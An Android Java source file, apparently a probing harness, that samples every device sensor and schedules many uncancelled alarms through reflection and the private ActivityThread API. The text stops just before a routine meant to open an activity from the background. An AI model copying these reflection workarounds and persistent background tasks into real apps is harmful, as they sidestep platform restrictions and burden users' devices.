package com.example.carapiaccess;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;

import androidx.annotation.RequiresApi;

import java.lang.ref.SoftReference;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Pure logic class: move all non-car-dependent function calls here.
 * onGetTemplate's "work" should be refactored into this class.
 */
public class CarDataLogic {
    private static final String TAG = "CarDataLogic";

    public static class Result {
        public final String title;
        public final List<String> rows;

        public Result(String title, List<String> rows) {
            this.title = title;
            this.rows = rows;
        }
    }

    private final Context appContext;

    public CarDataLogic(Context ctx) {
        this.appContext = ctx.getApplicationContext();
    }

    /**
     * Inside CarDataLogic class (com.example.carapiaccess.logic)
     */
    public Result exercise_oneSamplePerSensor_v3() {
        final String TAG = "exercise_oneSamplePerSensor_v3";
        // original result map preserved for parity if you want to inspect it later
        final java.util.Map<String,Object> result = new java.util.LinkedHashMap<>();

        // thread-safe list of UI rows (what will be returned for display)
        final java.util.List<String> uiRows = java.util.Collections.synchronizedList(new java.util.ArrayList<>());

        // Tuning (unchanged)
        final int TOTAL_SAMPLE_WINDOW_MS = 5_000; // longer default probe window (5s)
        final int[] SAMPLING_PERIOD_US_TRIES = new int[] {
                android.hardware.SensorManager.SENSOR_DELAY_NORMAL,
                android.hardware.SensorManager.SENSOR_DELAY_GAME,
                android.hardware.SensorManager.SENSOR_DELAY_FASTEST
        };

        // Use the existing CarDataLogic appContext when available; keep reflective fallback for parity
        android.content.Context context = null;
        try {
            try {
                // prefer the injected context if present
                if (this.appContext != null) {
                    context = this.appContext;
                    android.util.Log.i(TAG, "using provided appContext");
                } else {
                    Class<?> at = Class.forName("android.app.ActivityThread");
                    java.lang.reflect.Method mcur = at.getDeclaredMethod("currentApplication");
                    mcur.setAccessible(true);
                    Object app = mcur.invoke(null);
                    if (app instanceof android.content.Context) context = (android.content.Context) app;
                    android.util.Log.i(TAG, "got context reflectively: " + app);
                }
            } catch (Throwable t) {
                android.util.Log.e(TAG, "Cannot get Application context reflectively", t);
            }
            if (context == null) {
                android.util.Log.e(TAG, "No context - continuing but SensorManager calls will likely fail");
                // keep running the rest (original code didn't return here)
            }

            final android.hardware.SensorManager sm = context == null ? null : (android.hardware.SensorManager) context.getSystemService(android.content.Context.SENSOR_SERVICE);
            if (sm == null) {
                android.util.Log.e(TAG, "SensorManager not available");
                // continue: main logic preserved
            }

            final java.util.List<android.hardware.Sensor> sensors = sm == null ? null : sm.getSensorList(android.hardware.Sensor.TYPE_ALL);
            result.put("sensor_count", sensors == null ? 0 : sensors.size());

            final java.util.Map<String, java.util.Map<String,Object>> staticInfo = new java.util.LinkedHashMap<>();
            if (sensors != null) {
                for (android.hardware.Sensor s : sensors) {
                    try {
                        java.util.Map<String,Object> m = new java.util.LinkedHashMap<>();
                        m.put("name", s.getName());
                        m.put("vendor", s.getVendor());
                        m.put("type", s.getType());
                        try { m.put("stringType", s.getStringType()); } catch (Throwable ignored) {}
                        staticInfo.put(s.getType() + "::" + s.getName(), m);
                    } catch (Throwable ex) {
                        android.util.Log.w(TAG, "static introspect failed for sensor " + s, ex);
                    }
                }
            }
            result.put("static", staticInfo);

            // Thread/handler for sensor callbacks
            final android.os.HandlerThread probeThread = new android.os.HandlerThread("SensorProbeOneSampleV3");
            probeThread.start();
            final android.os.Handler probeHandler = new android.os.Handler(probeThread.getLooper());

            // where we'll store results (unchanged)
            final java.util.concurrent.ConcurrentHashMap<String, java.util.Map<String,Object>> singleSamples = new java.util.concurrent.ConcurrentHashMap<>();
            final java.util.concurrent.ConcurrentHashMap<String, Long> lastTs = new java.util.concurrent.ConcurrentHashMap<>();
            final java.util.concurrent.ConcurrentHashMap<String, android.hardware.SensorEventListener> listeners = new java.util.concurrent.ConcurrentHashMap<>();

            final java.util.function.Function<android.hardware.Sensor, String> keyFor = (s) -> s.getType() + "::" + s.getName();

            // Helper: safe register attempts for a given listener + sensor + sampling param (unchanged logic)
            java.util.function.BiConsumer<android.hardware.SensorEventListener, android.hardware.Sensor> tryRegister =
                    (listener, sensor) -> {
                        boolean ok = false;
                        // Try signature with samplingPeriod and Handler (int/Handler)
                        try {
                            java.lang.reflect.Method m = sm.getClass().getMethod("registerListener", android.hardware.SensorEventListener.class, android.hardware.Sensor.class, int.class, android.os.Handler.class);
                            m.setAccessible(true);
                            for (int sp : SAMPLING_PERIOD_US_TRIES) {
                                try {
                                    m.invoke(sm, listener, sensor, sp, probeHandler);
                                    ok = true;
                                    break;
                                } catch (Throwable inner) { /* try next */ }
                            }
                        } catch (Throwable ignored) {
                            // fallback to registerListener(listener, sensor, rate)
                            try {
                                java.lang.reflect.Method m2 = sm.getClass().getMethod("registerListener", android.hardware.SensorEventListener.class, android.hardware.Sensor.class, int.class);
                                m2.setAccessible(true);
                                for (int sp : SAMPLING_PERIOD_US_TRIES) {
                                    try {
                                        m2.invoke(sm, listener, sensor, sp);
                                        ok = true;
                                        break;
                                    } catch (Throwable inner) { /* try next */ }
                                }
                            } catch (Throwable ignored2) {
                                // lastly try the Java API direct call without samplingPeriod (default delay)
                                try {
                                    sm.registerListener(listener, sensor, android.hardware.SensorManager.SENSOR_DELAY_NORMAL, probeHandler);
                                    ok = true;
                                } catch (Throwable t3) {
                                    try { sm.registerListener(listener, sensor, android.hardware.SensorManager.SENSOR_DELAY_NORMAL); ok = true; } catch (Throwable t4) { ok = false; }
                                }
                            }
                        }
                        android.util.Log.i(TAG, "attempt registerListener for sensor: " + sensor.getName() + " => " + ok);
                    };

            final java.util.Set<Integer> SUPPORTED_TYPES = new java.util.HashSet<>(java.util.Arrays.asList(
                    android.hardware.Sensor.TYPE_ACCELEROMETER,
                    android.hardware.Sensor.TYPE_ACCELEROMETER_LIMITED_AXES,
                    android.hardware.Sensor.TYPE_ACCELEROMETER_LIMITED_AXES_UNCALIBRATED,
                    android.hardware.Sensor.TYPE_ACCELEROMETER_UNCALIBRATED,
                    android.hardware.Sensor.TYPE_AMBIENT_TEMPERATURE,
                    android.hardware.Sensor.TYPE_GAME_ROTATION_VECTOR,
                    android.hardware.Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR,
                    android.hardware.Sensor.TYPE_GRAVITY,
                    android.hardware.Sensor.TYPE_GYROSCOPE,
                    android.hardware.Sensor.TYPE_GYROSCOPE_LIMITED_AXES,
                    android.hardware.Sensor.TYPE_GYROSCOPE_LIMITED_AXES_UNCALIBRATED,
                    android.hardware.Sensor.TYPE_GYROSCOPE_UNCALIBRATED,
                    android.hardware.Sensor.TYPE_HEADING,
                    android.hardware.Sensor.TYPE_HEAD_TRACKER,
                    android.hardware.Sensor.TYPE_HEART_BEAT,
                    android.hardware.Sensor.TYPE_HEART_RATE,
                    android.hardware.Sensor.TYPE_HINGE_ANGLE,
                    android.hardware.Sensor.TYPE_LIGHT,
                    android.hardware.Sensor.TYPE_LINEAR_ACCELERATION,
                    android.hardware.Sensor.TYPE_LOW_LATENCY_OFFBODY_DETECT,
                    android.hardware.Sensor.TYPE_MAGNETIC_FIELD,
                    android.hardware.Sensor.TYPE_MAGNETIC_FIELD_UNCALIBRATED,
                    android.hardware.Sensor.TYPE_MOTION_DETECT,
                    android.hardware.Sensor.TYPE_ORIENTATION,
                    android.hardware.Sensor.TYPE_POSE_6DOF,
                    android.hardware.Sensor.TYPE_PRESSURE,
                    android.hardware.Sensor.TYPE_PROXIMITY,
                    android.hardware.Sensor.TYPE_RELATIVE_HUMIDITY,
                    android.hardware.Sensor.TYPE_ROTATION_VECTOR,
                    android.hardware.Sensor.TYPE_SIGNIFICANT_MOTION,
                    android.hardware.Sensor.TYPE_STATIONARY_DETECT,
                    android.hardware.Sensor.TYPE_STEP_COUNTER,
                    android.hardware.Sensor.TYPE_STEP_DETECTOR,
                    android.hardware.Sensor.TYPE_TEMPERATURE
            ));

            // Classify sensors into primary (hardware) and others (derived/virtual)
            final java.util.List<android.hardware.Sensor> primary = new java.util.ArrayList<>();
            final java.util.List<android.hardware.Sensor> derived = new java.util.ArrayList<>();
            if (sensors != null) {
                for (android.hardware.Sensor s : sensors) {
                    int t = s.getType();
                    if (SUPPORTED_TYPES.contains(t)) {
                        primary.add(s);
                    } else {
                        derived.add(s);
                    }
                }
            }

            // Function to create per-sensor listener
            java.util.function.Function<android.hardware.Sensor, android.hardware.SensorEventListener> makeListener =
                    (sensorRef) -> new android.hardware.SensorEventListener() {
                        @Override
                        public void onSensorChanged(android.hardware.SensorEvent event) {
                            if (event == null || event.sensor == null) return;
                            String key = keyFor.apply(event.sensor);
                            java.util.Map<String,Object> smp = new java.util.LinkedHashMap<>();
                            smp.put("timestamp_ns", event.timestamp);
                            smp.put("accuracy", event.accuracy);
                            java.util.List<Number> vals = new java.util.ArrayList<>();
                            if (event.values != null) for (float f : event.values) vals.add(f);
                            smp.put("values", vals);

                            java.util.Map<String,Object> prev = singleSamples.putIfAbsent(key, smp);
                            if (prev == null) {
                                lastTs.put(key, event.timestamp);
                                android.util.Log.i(TAG, "ONE-SAMPLE " + key + " -> " + vals);

                                String keyForUiRender = "Sensor: " + key;
                                // Replace addDynamicRow(...) with uiRows.add(...)
                                uiRows.add(keyForUiRender + " -> " + vals);

                                // unregister this sensor/listener only
                                try { sm.unregisterListener(this, sensorRef); } catch (Throwable ignored) {}
                            }
                        }
                        @Override
                        public void onAccuracyChanged(android.hardware.Sensor sensor, int accuracy) { /* no-op */ }
                    };

            // Register a list of sensors (creating per-sensor listeners and storing them)
            java.util.function.Consumer<java.util.List<android.hardware.Sensor>> registerList = (list) -> {
                for (android.hardware.Sensor s : list) {
                    try {
                        final android.hardware.Sensor sensorRef = s;
                        final android.hardware.SensorEventListener perSensorListener = makeListener.apply(sensorRef);
                        String key = keyFor.apply(sensorRef);
                        listeners.put(key, perSensorListener);
                        // perform registration attempts (with the helper)
                        tryRegister.accept(perSensorListener, sensorRef);
                    } catch (Throwable e) {
                        android.util.Log.w(TAG, "register failed for " + s.getName(), e);
                    }
                }
            };

            // PHASE 1: register primary sensors first, allow them to start
            registerList.accept(primary);
            try { Thread.sleep(1000); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }

            // PHASE 2: register derived sensors
            registerList.accept(derived);

            // Aggressive re-register loop (unchanged)
            long start = System.currentTimeMillis();
            for (int spTry = 0; spTry < SAMPLING_PERIOD_US_TRIES.length; spTry++) {
                if (sensors == null) break;
                for (android.hardware.Sensor s : sensors) {
                    String key = keyFor.apply(s);
                    if (singleSamples.containsKey(key)) continue;
                    android.hardware.SensorEventListener listener = listeners.get(key);
                    if (listener == null) continue;
                    int sp = SAMPLING_PERIOD_US_TRIES[spTry];
                    try {
                        try {
                            java.lang.reflect.Method m = sm.getClass().getMethod("registerListener", android.hardware.SensorEventListener.class, android.hardware.Sensor.class, int.class, android.os.Handler.class);
                            m.setAccessible(true);
                            m.invoke(sm, listener, s, sp, probeHandler);
                        } catch (Throwable t) {
                            try {
                                java.lang.reflect.Method m2 = sm.getClass().getMethod("registerListener", android.hardware.SensorEventListener.class, android.hardware.Sensor.class, int.class);
                                m2.setAccessible(true);
                                m2.invoke(sm, listener, s, sp);
                            } catch (Throwable tt) {
                                try { sm.registerListener(listener, s, sp, probeHandler); } catch (Throwable t3) { try { sm.registerListener(listener, s, sp); } catch (Throwable ignored) {} }
                            }
                        }
                    } catch (Throwable e) {
                        android.util.Log.w(TAG, "re-register failed for " + s.getName(), e);
                    }
                }
                try { Thread.sleep(400); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
                if (singleSamples.size() >= (sensors==null?0:sensors.size())) break;
                if (System.currentTimeMillis() - start > TOTAL_SAMPLE_WINDOW_MS) break;
            }

            // Final wait for remainder of the window
            long elapsed = System.currentTimeMillis() - start;
            long waitRemaining = TOTAL_SAMPLE_WINDOW_MS - elapsed;
            if (waitRemaining > 0) {
                try { Thread.sleep(waitRemaining); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
            }

            // Cleanup: unregister any remaining listeners
            try {
                for (java.util.Map.Entry<String, android.hardware.SensorEventListener> en : listeners.entrySet()) {
                    try { sm.unregisterListener(en.getValue()); } catch (Throwable ignored) {}
                }
            } catch (Throwable ignored) {}

            try { probeThread.quitSafely(); } catch (Throwable ignored) {}

            // Assemble result per sensor and missing list (unchanged)
            java.util.Map<String,Object> perSensor = new java.util.LinkedHashMap<>();
            java.util.List<String> missing = new java.util.ArrayList<>();
            if (sensors != null) {
                for (android.hardware.Sensor s : sensors) {
                    String key = keyFor.apply(s);
                    java.util.Map<String,Object> entry = new java.util.LinkedHashMap<>();
                    entry.put("static", staticInfo.getOrDefault(key, new java.util.LinkedHashMap<>()));
                    java.util.Map<String,Object> smp = singleSamples.get(key);
                    if (smp != null) {
                        entry.put("sample", smp);
                        entry.put("sampleCount", 1);
                    } else {
                        entry.put("sample", new java.util.LinkedHashMap<>());
                        entry.put("sampleCount", 0);
                        missing.add(key);
                    }
                    entry.put("lastTs_ns", lastTs.get(key));
                    perSensor.put(key, entry);
                }
            }

            result.put("perSensor", perSensor);
            result.put("singleSamples", singleSamples);
            result.put("missingSensors", missing);
            result.put("capturedCount", singleSamples.size());
            result.put("timeout_ms", TOTAL_SAMPLE_WINDOW_MS);
            android.util.Log.i(TAG, "One-sample v3 probe complete; captured=" + singleSamples.size() + " / " + (sensors==null?0:sensors.size()));

            // UI render replacement: add a summary row
            uiRows.add("Sensors_Accessed: " + singleSamples.size() + " / " + (sensors==null?0:sensors.size()));

        } catch (Throwable t) {
            android.util.Log.e("exercise_oneSamplePerSensor_v3", "Unexpected error in probe", t);
            uiRows.add("Error in probe: " + t.getMessage());
        }

        // Build a Result for UI rendering
        String title = "One-sample v3 probe";
        return new Result(title, new java.util.ArrayList<>(uiRows));
    }


    // ------------------------------------------ CarDataLogic fields for Alarm impact UI collection -------------
    private final java.util.List<String> alarmUiRows =
            java.util.Collections.synchronizedList(new java.util.ArrayList<>());

    // Keep refs so the receiver doesn't get GC'd
    private volatile android.content.BroadcastReceiver alarmImpactReceiver;

    // Optional: prevent registering multiple times
    private final java.util.concurrent.atomic.AtomicBoolean alarmImpactInitialized =
            new java.util.concurrent.atomic.AtomicBoolean(false);

    private void alarmUi(String line) {
        // timestamped for easy reading
        String msg = "[" + java.text.DateFormat.getTimeInstance().format(new java.util.Date()) + "] " + line;
        android.util.Log.d("NOTE", msg);
        alarmUiRows.add(msg);
    }

    public Result getAlarmImpactSnapshot() {
        return new Result("Alarm Impact (snapshot)", new java.util.ArrayList<>(alarmUiRows));
    }

    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    public Result reflectExerciseAlarmManagerVisibleImpact() {
        final String TAG = "ReflectAlarmImpact";

        try {
            // ---- 0) Get a Context (no params) ----
            android.content.Context ctx = null;

            // Prefer CarDataLogic appContext if available
            try {
                if (this.appContext != null) {
                    ctx = this.appContext;
                }
            } catch (Throwable ignored) {}

            // Keep your original reflective fallback attempts (unchanged intent)
            if (ctx == null) {
                try {
                    java.lang.reflect.Method m = getClass().getMethod("getCarContext");
                    ctx = (android.content.Context) m.invoke(this);
                } catch (Throwable ignore) {
                    try {
                        java.lang.reflect.Method m = getClass().getMethod("getApplicationContext");
                        ctx = (android.content.Context) m.invoke(this);
                    } catch (Throwable ignore2) {
                        // Last fallback like you used elsewhere (ActivityThread)
                        try {
                            @SuppressLint("PrivateApi") Class<?> at = Class.forName("android.app.ActivityThread");
                            @SuppressLint("DiscouragedPrivateApi") java.lang.reflect.Method mcur = at.getDeclaredMethod("currentApplication");
                            mcur.setAccessible(true);
                            Object app = mcur.invoke(null);
                            if (app instanceof android.content.Context) ctx = (android.content.Context) app;
                        } catch (Throwable ignored3) {}
                    }
                }
            }

            if (ctx == null) {
                android.util.Log.w(TAG, "Context is null; aborting.");
                alarmUi("Context is null; aborting.");
                return new Result("Alarm Impact (failed)", new java.util.ArrayList<>(alarmUiRows));
            }

            // Prevent duplicates if you call it multiple times
            if (!alarmImpactInitialized.compareAndSet(false, true)) {
                alarmUi("Already initialized once; skipping re-register/schedule to avoid duplicates.");
                return new Result("Alarm Impact (already running)", new java.util.ArrayList<>(alarmUiRows));
            }

            // ---- 1) Reflect-load AlarmManager and obtain instance ----
            Class<?> alarmMgrCls = Class.forName("android.app.AlarmManager");
            Object alarmMgr = android.content.Context.class
                    .getMethod("getSystemService", String.class)
                    .invoke(ctx, android.content.Context.ALARM_SERVICE);

            if (alarmMgr == null) {
                android.util.Log.w(TAG, "AlarmManager is null; aborting.");
                alarmUi("AlarmManager is null; aborting.");
                return new Result("Alarm Impact (failed)", new java.util.ArrayList<>(alarmUiRows));
            }
            android.util.Log.d(TAG, "Got AlarmManager via reflection: " + alarmMgr.getClass());
            alarmUi("Got AlarmManager via reflection: " + alarmMgr.getClass());

            // ---- 2) Resolve alarm type constants reflectively (safe defaults) ----
            int RTC_WAKEUP = 0, RTC = 1, ELAPSED_REALTIME_WAKEUP = 2, ELAPSED_REALTIME = 3;
            try { RTC_WAKEUP = alarmMgrCls.getField("RTC_WAKEUP").getInt(null); } catch (Throwable ignore) {}
            try { RTC = alarmMgrCls.getField("RTC").getInt(null); } catch (Throwable ignore) {}
            try { ELAPSED_REALTIME_WAKEUP = alarmMgrCls.getField("ELAPSED_REALTIME_WAKEUP").getInt(null); } catch (Throwable ignore) {}
            try { ELAPSED_REALTIME = alarmMgrCls.getField("ELAPSED_REALTIME").getInt(null); } catch (Throwable ignore) {}

            // ---- 3) Register a runtime receiver so PendingIntent alarms are visible ----
            final String ACTION = "com.reflect.ALARM_TEST_VISIBLE_IMPACT";
            final java.util.concurrent.atomic.AtomicInteger recvCount = new java.util.concurrent.atomic.AtomicInteger(0);

            android.content.BroadcastReceiver rcv = new android.content.BroadcastReceiver() {
                @Override public void onReceive(android.content.Context context, android.content.Intent intent) {
                    int c = recvCount.incrementAndGet();
                    String extra = (intent != null) ? String.valueOf(intent.getExtras()) : "null";
                    String line =
                            "BroadcastReceiver FIRED! count=" + c
                                    + " action=" + (intent != null ? intent.getAction() : "null")
                                    + " extras=" + extra
                                    + " nowRtc=" + System.currentTimeMillis()
                                    + " nowElapsed=" + android.os.SystemClock.elapsedRealtime();

                    android.util.Log.i(TAG, line);
                    alarmUi(line);
                }
            };

            boolean receiverRegistered = false;
            try {
                android.content.IntentFilter f = new android.content.IntentFilter(ACTION);
                ctx.registerReceiver(rcv, f, Context.RECEIVER_NOT_EXPORTED);
                receiverRegistered = true;
                this.alarmImpactReceiver = rcv; // keep reference
                android.util.Log.d(TAG, "Registered runtime BroadcastReceiver for action=" + ACTION);
                alarmUi("Registered runtime BroadcastReceiver for action=" + ACTION);
            } catch (Throwable t) {
                android.util.Log.w(TAG, "Failed to register runtime BroadcastReceiver: " + t);
                alarmUi("Failed to register runtime BroadcastReceiver: " + t);
            }

            // ---- 4) Build a PendingIntent that targets our runtime receiver ----
            android.content.Intent bi = new android.content.Intent(ACTION);
            bi.setPackage(ctx.getPackageName());
            bi.putExtra("src", "reflectExerciseAlarmManagerVisibleImpact");

            int piFlags = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
            if (android.os.Build.VERSION.SDK_INT >= 23) piFlags |= android.app.PendingIntent.FLAG_IMMUTABLE;

            android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(ctx, 777, bi, piFlags);

            // ---- 5) Create an OnAlarmListener proxy for direct callbacks ----
            Class<?> onAlarmListenerIface = Class.forName("android.app.AlarmManager$OnAlarmListener");
            java.util.concurrent.atomic.AtomicInteger listenerCount = new java.util.concurrent.atomic.AtomicInteger(0);

            Object listenerProxy = java.lang.reflect.Proxy.newProxyInstance(
                    onAlarmListenerIface.getClassLoader(),
                    new Class<?>[]{ onAlarmListenerIface },
                    (proxy, method, args) -> {
                        String name = method.getName();
                        if ("onAlarm".equals(name)) {
                            int c = listenerCount.incrementAndGet();
                            String line =
                                    "OnAlarmListener FIRED! count=" + c
                                            + " nowRtc=" + System.currentTimeMillis()
                                            + " nowElapsed=" + android.os.SystemClock.elapsedRealtime();

                            android.util.Log.i(TAG, line);
                            alarmUi(line);
                            return null;
                        }
                        if ("hashCode".equals(name)) return System.identityHashCode(proxy);
                        if ("equals".equals(name)) return (proxy == (args != null && args.length > 0 ? args[0] : null));
                        if ("toString".equals(name)) return "OnAlarmListenerProxy@" + Integer.toHexString(System.identityHashCode(proxy));
                        return null;
                    }
            );

            android.os.Handler mainHandler = new android.os.Handler(android.os.Looper.getMainLooper());
            java.util.concurrent.Executor directExec = java.lang.Runnable::run;

            // ---- 6) STATUS ticker (keeps printing so “impact” is visible even if alarms are deferred) ----
            java.lang.reflect.Method canExact = null;
            java.lang.reflect.Method getNextAlarmClock = null;
            java.lang.reflect.Method getNextWakeFromIdleTime = null;
            try { canExact = alarmMgrCls.getMethod("canScheduleExactAlarms"); } catch (Throwable ignore) {}
            try { getNextAlarmClock = alarmMgrCls.getMethod("getNextAlarmClock"); } catch (Throwable ignore) {}
            try { getNextWakeFromIdleTime = alarmMgrCls.getMethod("getNextWakeFromIdleTime"); } catch (Throwable ignore) {}

            java.lang.reflect.Method finalCanExact = canExact;
            java.lang.reflect.Method finalGetNextAlarmClock = getNextAlarmClock;
            java.lang.reflect.Method finalGetNextWake = getNextWakeFromIdleTime;

            boolean finalReceiverRegistered = receiverRegistered;
            Runnable statusTicker = new Runnable() {
                int ticks = 0;
                @Override public void run() {
                    ticks++;
                    try {
                        Object ok = (finalCanExact != null) ? finalCanExact.invoke(alarmMgr) : "n/a";
                        Object nextClock = (finalGetNextAlarmClock != null) ? finalGetNextAlarmClock.invoke(alarmMgr) : "n/a";
                        Object nextWake = (finalGetNextWake != null) ? finalGetNextWake.invoke(alarmMgr) : "n/a";

                        String line =
                                "STATUS tick=" + ticks
                                        + " canScheduleExactAlarms=" + ok
                                        + " nextAlarmClock=" + nextClock
                                        + " nextWakeFromIdleTime=" + nextWake
                                        + " recvCount=" + recvCount.get()
                                        + " listenerCount=" + listenerCount.get()
                                        + " receiverRegistered=" + finalReceiverRegistered
                                        + " nowElapsed=" + android.os.SystemClock.elapsedRealtime();

                        android.util.Log.d(TAG, line);
                        alarmUi(line);
                    } catch (Throwable t) {
                        android.util.Log.w(TAG, "STATUS tick error: " + t);
                        alarmUi("STATUS tick error: " + t);
                    }
                    mainHandler.postDelayed(this, 3000L);
                }
            };
            mainHandler.post(statusTicker);

            // ---- 7) Schedule alarms (DO NOT CANCEL) ----
            long nowRtc = System.currentTimeMillis();
            long nowElapsed = android.os.SystemClock.elapsedRealtime();

            long tPlus2sElapsed = nowElapsed + 2000L;
            long tPlus4sElapsed = nowElapsed + 4000L;
            long tPlus6sRtc = nowRtc + 6000L;
            long tPlus8sElapsed = nowElapsed + 8000L;
            long tPlus10sRtc = nowRtc + 10000L;
            long tPlus12sRtc = nowRtc + 12000L;

            // Helper to log InvocationTargetException properly
            java.util.function.Consumer<Throwable> logIte = (Throwable t) -> {
                if (t instanceof java.lang.reflect.InvocationTargetException) {
                    Throwable target = ((java.lang.reflect.InvocationTargetException) t).getTargetException();
                    android.util.Log.w(TAG, "InvocationTargetException -> " + target, target);
                    alarmUi("InvocationTargetException -> " + target);
                } else {
                    android.util.Log.w(TAG, "Exception -> " + t, t);
                    alarmUi("Exception -> " + t);
                }
            };

            // 7.1 set(type, trigger, PendingIntent)
            try {
                java.lang.reflect.Method mSetPI = alarmMgrCls.getMethod(
                        "set", int.class, long.class, android.app.PendingIntent.class);
                mSetPI.invoke(alarmMgr, RTC_WAKEUP, tPlus10sRtc, pi);
                android.util.Log.d(TAG, "Scheduled: set(RTC_WAKEUP, +10s, PI)");
                alarmUi("Scheduled: set(RTC_WAKEUP, +10s, PI)");
            } catch (Throwable t) {
                android.util.Log.w(TAG, "set(type, trigger, PI) failed");
                alarmUi("set(type, trigger, PI) failed");
                logIte.accept(t);
            }

            // 7.2 setExact(type, trigger, PendingIntent)
            try {
                java.lang.reflect.Method mSetExactPI = alarmMgrCls.getMethod(
                        "setExact", int.class, long.class, android.app.PendingIntent.class);
                mSetExactPI.invoke(alarmMgr, RTC_WAKEUP, tPlus6sRtc, pi);
                android.util.Log.d(TAG, "Scheduled: setExact(RTC_WAKEUP, +6s, PI)");
                alarmUi("Scheduled: setExact(RTC_WAKEUP, +6s, PI)");
            } catch (Throwable t) {
                android.util.Log.w(TAG, "setExact(type, trigger, PI) failed (still keeping others scheduled)");
                alarmUi("setExact(type, trigger, PI) failed (still keeping others scheduled)");
                logIte.accept(t);
            }

            // 7.3 setExact(type, trigger, tag, OnAlarmListener, Handler)
            try {
                java.lang.reflect.Method mSetExactListener = alarmMgrCls.getMethod(
                        "setExact", int.class, long.class, String.class,
                        onAlarmListenerIface, android.os.Handler.class);
                mSetExactListener.invoke(alarmMgr, ELAPSED_REALTIME_WAKEUP, tPlus4sElapsed,
                        "reflect_exact_listener", listenerProxy, mainHandler);
                android.util.Log.d(TAG, "Scheduled: setExact(ELAPSED_REALTIME_WAKEUP, +4s, listener)");
                alarmUi("Scheduled: setExact(ELAPSED_REALTIME_WAKEUP, +4s, listener)");
            } catch (Throwable t) {
                android.util.Log.w(TAG, "setExact(type, trigger, tag, listener, handler) failed");
                alarmUi("setExact(type, trigger, tag, listener, handler) failed");
                logIte.accept(t);
            }

            // 7.4 setWindow(type, start, length, PendingIntent)
            try {
                java.lang.reflect.Method mWindowPI = alarmMgrCls.getMethod(
                        "setWindow", int.class, long.class, long.class, android.app.PendingIntent.class);
                mWindowPI.invoke(alarmMgr, RTC, tPlus12sRtc, 3000L, pi);
                android.util.Log.d(TAG, "Scheduled: setWindow(RTC, +12s, window=3s, PI)");
                alarmUi("Scheduled: setWindow(RTC, +12s, window=3s, PI)");
            } catch (Throwable t) {
                android.util.Log.w(TAG, "setWindow(..., PI) failed");
                alarmUi("setWindow(..., PI) failed");
                logIte.accept(t);
            }

            // 7.5 setRepeating(type, triggerElapsed, interval, PendingIntent)  -> visible every 5s
            try {
                java.lang.reflect.Method mRep = alarmMgrCls.getMethod(
                        "setRepeating", int.class, long.class, long.class, android.app.PendingIntent.class);
                mRep.invoke(alarmMgr, ELAPSED_REALTIME, tPlus2sElapsed, 5000L, pi);
                android.util.Log.d(TAG, "Scheduled: setRepeating(ELAPSED_REALTIME, start+2s, every 5s, PI)");
                alarmUi("Scheduled: setRepeating(ELAPSED_REALTIME, start+2s, every 5s, PI)");
            } catch (Throwable t) {
                android.util.Log.w(TAG, "setRepeating(..., PI) failed");
                alarmUi("setRepeating(..., PI) failed");
                logIte.accept(t);
            }

            // 7.6 setAndAllowWhileIdle(type, trigger, PendingIntent)
            try {
                java.lang.reflect.Method mAllowIdle = alarmMgrCls.getMethod(
                        "setAndAllowWhileIdle", int.class, long.class, android.app.PendingIntent.class);
                mAllowIdle.invoke(alarmMgr, RTC_WAKEUP, nowRtc + 15000L, pi);
                android.util.Log.d(TAG, "Scheduled: setAndAllowWhileIdle(RTC_WAKEUP, +15s, PI)");
                alarmUi("Scheduled: setAndAllowWhileIdle(RTC_WAKEUP, +15s, PI)");
            } catch (Throwable t) {
                android.util.Log.w(TAG, "setAndAllowWhileIdle(..., PI) failed");
                alarmUi("setAndAllowWhileIdle(..., PI) failed");
                logIte.accept(t);
            }

            // 7.7 windowed listener alarm using Executor variant (if available)
            try {
                java.lang.reflect.Method mWindowListenerExec = alarmMgrCls.getMethod(
                        "setWindow", int.class, long.class, long.class, String.class,
                        java.util.concurrent.Executor.class, onAlarmListenerIface);
                mWindowListenerExec.invoke(alarmMgr, ELAPSED_REALTIME, tPlus8sElapsed, 2000L,
                        "reflect_window_listener", directExec, listenerProxy);
                android.util.Log.d(TAG, "Scheduled: setWindow(ELAPSED_REALTIME, +8s, window=2s, listener)");
                alarmUi("Scheduled: setWindow(ELAPSED_REALTIME, +8s, window=2s, listener)");
            } catch (Throwable t) {
                android.util.Log.w(TAG, "setWindow(..., Executor, listener) failed");
                alarmUi("setWindow(..., Executor, listener) failed");
                logIte.accept(t);
            }

            String expected =
                    "DONE scheduling alarms (NOT canceling). Expected visible impact:\n"
                            + " - BroadcastReceiver.onReceive() should fire repeatedly (~every 5s) from setRepeating\n"
                            + " - OnAlarmListener.onAlarm() should fire from setExact(listener) around +4s\n"
                            + " - Additional PI alarms may fire around +6s/+10s/+12s/+15s depending on policy\n"
                            + "If you still see nothing firing, the environment (doze/OEM policy) may defer alarms or kill your process.";
            android.util.Log.i(TAG, expected);
            alarmUi(expected);

            // Return snapshot of rows at the moment we finish scheduling.
            // (More rows will be added later by receiver/listener/ticker.)
            return new Result("Alarm Impact (live)", new java.util.ArrayList<>(alarmUiRows));

        } catch (Throwable t) {
            android.util.Log.e(TAG, "fatal error", t);
            alarmUi("fatal error: " + t);
            return new Result("Alarm Impact (fatal)", new java.util.ArrayList<>(alarmUiRows));
        }
    }


    // ---- UI rows for "notify + try open app" alarm impact ----
    private final java.util.List<String> alarmOpenUiRows =
            java.util.Collections.synchronizedList(new java.util.ArrayList<>());

    private volatile android.content.BroadcastReceiver alarmOpenReceiver;

    private final java.util.concurrent.atomic.AtomicBoolean alarmOpenInitialized =
            new java.util.concurrent.atomic.AtomicBoolean(false);

    private void alarmOpenUi(String line) {
        String msg = "[" + java.text.DateFormat.getTimeInstance().format(new java.util.Date()) + "] " + line;
        alarmOpenUiRows.add(msg);
    }

    public Result getAlarmOpenAppImpactSnapshot() {
        return new Result("Alarm Open-App Impact (snapshot)", new java.util.ArrayList<>(alarmOpenUiRows));
    }


    //GETS blocked while opening activity
    @android.annotation.SuppressLint({"MissingPermission", "UnspecifiedRegisterReceiverFlag"})
